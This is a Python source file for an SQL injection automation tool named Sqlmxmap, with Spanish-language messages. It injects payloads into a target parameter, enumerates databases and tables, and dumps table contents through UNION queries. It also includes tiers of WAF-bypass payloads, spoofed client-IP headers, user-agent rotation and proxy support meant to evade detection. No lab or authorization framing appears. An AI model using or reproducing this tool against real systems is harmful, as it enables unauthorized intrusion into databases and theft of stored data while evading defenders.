#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import requests
import argparse
import time
import random
import json
import csv
import threading
import queue
from urllib.parse import urljoin, urlencode, parse_qs, urlparse
from colorama import init, Fore, Style, Back

init(autoreset=True)

banner = f"""
{Fore.RED}
╔════════════════════════════════════════════════════════════════════════════╗
║     ______       _               _                                        ║
║    /  ___|     | |             | |                                       ║
║    \ `--.  __ _| |_ __ ___   __| |                                       ║
║     `--. \/ _` | | '_ ` _ \ / _` |                                       ║
║    /\__/ / (_| | | | | | | | (_| |                                       ║
║    \____/ \__,_|_|_| |_| |_|\__,_|                                       ║
║                                                                          ║
║      {Fore.YELLOW}SQL Injection Automation Tool v3.0 - ULTIMATE{Fore.RED}                      ║
║         {Fore.CYAN}Multi-Threaded | WAF Bypass | Proxy Ready{Fore.RED}                        ║
║                  {Fore.GREEN}' OR 1=1 -- -{Fore.RED}                                            ║
╚════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

class Sqlmxmap:
    def __init__(self, url, param, method="GET", data=None, cookies=None, proxy=None, 
                 threads=5, verbosity=0, stealth=False, waf_level=1, output=None):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.data = data
        self.cookies = self._parse_cookies(cookies) if cookies else {}
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.threads = threads
        self.verbosity = verbosity
        self.stealth = stealth
        self.waf_level = waf_level
        self.output = output
        self.session = requests.Session()
        self.results = []
        self.queue = queue.Queue()
        self.lock = threading.Lock()
        
        # User agents para stealth
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Firefox/121.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36"
        ]
        
        # Payloads WAF bypass por nivel
        self.waf_payloads = {
            1: ["'", "\"", "' OR '1'='1", "' OR 1=1-- -"],
            2: ["'/**/OR/**/1=1--", "' OR '1'='1'#", "') OR ('1'='1"],
            3: ["'%0aOR%0a1=1--", "'%0d%0aOR%0d%0a1=1--", "'||1=1--", "'%2527OR 1=1--"],
            4: ["/*!50000OR*/ 1=1--", "' OR 1=1 AND SLEEP(5)--", "' WAITFOR DELAY '0:0:5'--"]
        }
        
    def _parse_cookies(self, cookie_str):
        cookies = {}
        if cookie_str:
            for item in cookie_str.split(';'):
                if '=' in item:
                    key, val = item.strip().split('=', 1)
                    cookies[key] = val
        return cookies
    
    def _get_headers(self):
        headers = {
            "User-Agent": random.choice(self.user_agents) if self.stealth else "Sqlmxmap/3.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close"
        }
        
        if self.waf_level >= 2:
            headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers["X-Client-IP"] = headers["X-Forwarded-For"]
            headers["X-Real-IP"] = headers["X-Forwarded-For"]
        
        return headers
    
    def _log(self, msg, level="INFO"):
        if self.verbosity >= 1 or level in ["RESULT", "SUCCESS", "ERROR"]:
            colors = {"INFO": Fore.CYAN, "SUCCESS": Fore.GREEN, "ERROR": Fore.RED, 
                     "RESULT": Fore.YELLOW, "WARNING": Fore.MAGENTA}
            prefix = colors.get(level, Fore.WHITE)
            print(f"{prefix}[{level}] {msg}{Style.RESET_ALL}")
    
    def _send_request(self, payload):
        try:
            if self.method == "GET":
                parsed = urlparse(self.url)
                params = parse_qs(parsed.query)
                params[self.param] = payload
                new_query = urlencode(params, doseq=True)
                target = parsed._replace(query=new_query).geturl()
                response = self.session.get(target, headers=self._get_headers(), 
                                           cookies=self.cookies, proxies=self.proxy, timeout=10)
            else:
                post_data = self.data.copy() if self.data else {}
                post_data[self.param] = payload
                response = self.session.post(self.url, data=post_data, headers=self._get_headers(),
                                            cookies=self.cookies, proxies=self.proxy, timeout=10)
            
            if self.verbosity >= 2:
                self._log(f"Payload: {payload[:50]} | Status: {response.status_code} | Length: {len(response.text)}")
            
            if self.stealth:
                time.sleep(random.uniform(0.3, 1.0))
            
            return response.text, response.status_code
        except Exception as e:
            if self.verbosity >= 2:
                self._log(f"Error: {str(e)}", "ERROR")
            return None, None
    
    def test_payload_worker(self):
        while not self.queue.empty():
            try:
                payload = self.queue.get_nowait()
                response, status = self._send_request(payload)
                
                if response and any(indicator in response.lower() for indicator in 
                                  ["mysql", "sql", "syntax", "error", "warning", "ora-", "postgres"]):
                    with self.lock:
                        self.results.append({"payload": payload, "vulnerable": True, "length": len(response)})
                        self._log(f"💉 ¡VULNERABLE! Payload: {payload}", "SUCCESS")
                elif response and self.verbosity >= 2:
                    with self.lock:
                        self.results.append({"payload": payload, "vulnerable": False, "length": len(response)})
                self.queue.task_done()
            except queue.Empty:
                break
    
    def is_vulnerable(self):
        self._log(f"🔍 Probando vulnerabilidad (WAF Level: {self.waf_level}, Threads: {self.threads})...")
        
        # Seleccionar payloads según nivel WAF
        payloads = self.waf_payloads.get(self.waf_level, self.waf_payloads[1])
        if self.waf_level > 2:
            payloads.extend(self.waf_payloads.get(self.waf_level-1, []))
        
        # Llenar queue
        for payload in payloads:
            self.queue.put(payload)
        
        # Crear y iniciar threads
        threads = []
        for _ in range(min(self.threads, len(payloads))):
            t = threading.Thread(target=self.test_payload_worker)
            t.start()
            threads.append(t)
        
        # Esperar a que terminen
        for t in threads:
            t.join()
        
        vulnerable = any(r.get("vulnerable", False) for r in self.results)
        if vulnerable:
            self._log("✅ ¡Sitio VULNERABLE a inyección SQL!", "SUCCESS")
        else:
            self._log("⚠️ No se detectó vulnerabilidad evidente", "WARNING")
        
        return vulnerable
    
    def extract_with_union(self, query):
        self._log(f"📊 Extrayendo con UNION: {query}")
        results = []
        
        for i in range(1, 20):
            payload = f"' UNION SELECT {query} LIMIT {i},1 -- -"
            if self.waf_level >= 3:
                payload = f"'%0aUNION%0aSELECT%0a{query}%0aLIMIT%0a{i},1--"
            elif self.waf_level >= 2:
                payload = f"'/**/UNION/**/SELECT/**/{query}/**/LIMIT/**/{i},1--"
            
            response, _ = self._send_request(payload)
            if response and len(response) > 100:
                results.append(response[:500])
                self._log(f"Extraído [{i}]: {response[:100]}...", "RESULT")
            else:
                break
        
        return results
    
    def get_databases(self):
        self._log("🗄️ Enumerando bases de datos...")
        
        payloads = [
            "' UNION SELECT schema_name FROM information_schema.schemata -- -",
            "' UNION SELECT datname FROM pg_database -- -",
            "' UNION SELECT name FROM master.dbo.sysdatabases -- -",
            "' UNION SELECT DISTINCT table_schema FROM information_schema.tables -- -"
        ]
        
        all_dbs = []
        for payload in payloads:
            if self.waf_level >= 2:
                payload = payload.replace("UNION", "/*!50000UNION*/").replace("SELECT", "/*!50000SELECT*/")
            
            response, _ = self._send_request(payload)
            if response:
                # Extracción básica
                all_dbs.append(f"Respuesta recibida (longitud: {len(response)})")
                self._log(f"Posible DB encontrada - Payload: {payload[:50]}...", "RESULT")
        
        if self.output:
            self._export_results({"databases": all_dbs, "timestamp": time.time()})
        
        return all_dbs
    
    def get_tables(self, database):
        self._log(f"📋 Extrayendo tablas de {database}...")
        payload = f"' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' -- -"
        
        if self.waf_level >= 2:
            payload = payload.replace("UNION", "/*!50000UNION*/").replace("SELECT", "/*!50000SELECT*/")
        
        response, _ = self._send_request(payload)
        if response:
            self._log(f"Tablas encontradas: {response[:300]}", "RESULT")
            if self.output:
                self._export_results({"database": database, "tables": response[:1000], "timestamp": time.time()})
        
        return response
    
    def dump_table(self, table):
        self._log(f"💾 Volcando datos de {table}...")
        results = []
        
        # Intentar diferentes métodos de extracción
        extraction_methods = [
            f"' UNION SELECT * FROM {table} -- -",
            f"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}' -- -",
            f"' UNION SELECT CONCAT_WS(0x3a, {table}.{self.param}, {table}.id) FROM {table} -- -"
        ]
        
        for method in extraction_methods:
            if self.waf_level >= 3:
                method = method.replace(" ", "%0a")
            
            response, _ = self._send_request(method)
            if response and len(response) > 100:
                results.append(response[:1000])
                self._log(f"Datos extraídos: {response[:200]}...", "RESULT")
        
        if self.output and results:
            self._export_results({"table": table, "data": results, "timestamp": time.time()})
        
        return results
    
    def _export_results(self, data):
        if not self.output:
            return
        
        try:
            if self.output.endswith('.json'):
                with open(self.output, 'w') as f:
                    json.dump(data, f, indent=2, default=str)
                self._log(f"📁 Resultados exportados a {self.output} (JSON)", "SUCCESS")
            
            elif self.output.endswith('.csv'):
                with open(self.output, 'w', newline='') as f:
                    writer = csv.writer(f)
                    writer.writerow(["Timestamp", "Type", "Data"])
                    writer.writerow([time.time(), "results", str(data)])
                self._log(f"📁 Resultados exportados a {self.output} (CSV)", "SUCCESS")
            
            else:
                with open(f"{self.output}.txt", 'w') as f:
                    f.write(str(data))
                self._log(f"📁 Resultados exportados a {self.output}.txt", "SUCCESS")
                
        except Exception as e:
            self._log(f"Error exportando: {str(e)}", "ERROR")
    
    def detect_db(self):
        self._log("🔬 Detectando motor de base de datos...")
        signatures = {
            "MySQL": ["@@version", "version()", "mysql", "information_schema"],
            "PostgreSQL": ["version()", "postgresql", "pg_sleep", "pg_database"],
            "MSSQL": ["@@version", "sql server", "master.dbo", "sysdatabases"],
            "Oracle": ["dual", "oracle", "rownum", "sysdate"],
            "SQLite": ["sqlite_version()", "sqlite_master"]
        }
        
        for db, signs in signatures.items():
            for sign in signs:
                payload = f"' UNION SELECT {sign} -- -"
                if self.waf_level >= 2:
                    payload = payload.replace("UNION", "/**/UNION/**/")
                
                response, _ = self._send_request(payload)
                if response and sign.lower() in response.lower():
                    self._log(f"✅ Base de datos detectada: {db}", "SUCCESS")
                    return db
        
        self._log("⚠️ No se pudo detectar DB específica", "WARNING")
        return "Unknown"

def main():
    print(banner)
    
    parser = argparse.ArgumentParser(description="Sqlmxmap - SQL Injection Tool ULTIMATE", 
                                     epilog="""
Ejemplos:
  python sqlmxmap.py -u "http://test.com/page.php?id=1" --dbs --stealth -v
  python sqlmxmap.py -u "http://test.com/login.php" -p user -m POST -d "user=admin&pass=123" --cookies "PHPSESSID=abc123" --proxy "http://127.0.0.1:8080"
  python sqlmxmap.py -u "http://test.com/page.php?id=1" --tables mydb --dump users --waf-level 3 --threads 10 -vv --output results.json
""", formatter_class=argparse.RawDescriptionHelpFormatter)
    
    # Argumentos principales
    parser.add_argument("-u", "--url", required=True, help="URL objetivo")
    parser.add_argument("-p", "--param", default="id", help="Parámetro a inyectar")
    parser.add_argument("-m", "--method", choices=["GET", "POST"], default="GET", help="Método HTTP")
    parser.add_argument("-d", "--data", help="Datos POST (formato: 'key1=value1&key2=value2')")
    parser.add_argument("--cookies", help="Cookies (formato: 'name1=value1; name2=value2')")
    parser.add_argument("--proxy", help="Proxy (ej: http://127.0.0.1:8080 o socks5://127.0.0.1:9050)")
    
    # Modos de operación
    parser.add_argument("--dbs", action="store_true", help="Enumerar bases de datos")
    parser.add_argument("--tables", help="Enumerar tablas de una DB específica")
    parser.add_argument("--dump", help="Volcar datos de una tabla específica")
    parser.add_argument("--detect-db", action="store_true", help="Detectar motor de DB")
    
    # Configuración avanzada
    parser.add_argument("-v", "--verbose", action="count", default=0, help="Modo verboso (-v, -vv, -vvv)")
    parser.add_argument("--stealth", action="store_true", help="Modo stealth (delay + rotación UA)")
    parser.add_argument("--waf-level", type=int, choices=[1,2,3,4], default=1, help="Nivel de evasión WAF (1-4)")
    parser.add_argument("--threads", type=int, default=5, help="Número de threads (default: 5)")
    parser.add_argument("--output", help="Exportar resultados (ej: results.json, data.csv)")
    
    args = parser.parse_args()
    
    # Procesar datos POST
    post_data = None
    if args.method == "POST" and args.data:
        post_data = dict(item.split("=") for item in args.data.split("&"))
    
    # Crear instancia
    tool = Sqlmxmap(
        url=args.url,
        param=args.param,
        method=args.method,
        data=post_data,
        cookies=args.cookies,
        proxy=args.proxy,
        threads=args.threads,
        verbosity=args.verbose,
        stealth=args.stealth,
        waf_level=args.waf_level,
        output=args.output
    )
    
    # Banner de configuración
    print(f"{Fore.CYAN}╔════════════════════════════════════════════╗")
    print(f"║ Configuración:                                ║")
    print(f"║ • URL: {args.url[:40]}...")
    print(f"║ • Método: {args.method}")
    print(f"║ • WAF Level: {args.waf_level}")
    print(f"║ • Threads: {args.threads}")
    if args.stealth:
        print(f"║ • Stealth: ACTIVADO")
    if args.proxy:
        print(f"║ • Proxy: {args.proxy}")
    if args.cookies:
        print(f"║ • Cookies: {args.cookies[:30]}...")
    print(f"{Fore.CYAN}╚════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    
    # Ejecutar acciones
    if not tool.is_vulnerable():
        print(f"{Fore.RED}[!] No se detectó vulnerabilidad evidente{Style.RESET_ALL}")
        if input("¿Continuar igual? (s/n): ").lower() != "s":
            sys.exit(0)
    
    print()  # Línea de separación
    
    if args.detect_db:
        tool.detect_db()
    
    if args.dbs:
        tool.get_databases()
    
    if args.tables:
        tool.get_tables(args.tables)
    
    if args.dump:
        tool.dump_table(args.dump)
    
    # Si no hay comandos específicos, mostrar ayuda
    if not (args.dbs or args.tables or args.dump or args.detect_db):
        parser.print_help()
        print(f"\n{Fore.YELLOW}💡 Tip: Usa --dbs, --tables o --dump para acciones específicas{Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}✅ Escaneo completado!{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Ctrl+C detectado. Saliendo...{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[!] Error fatal: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)
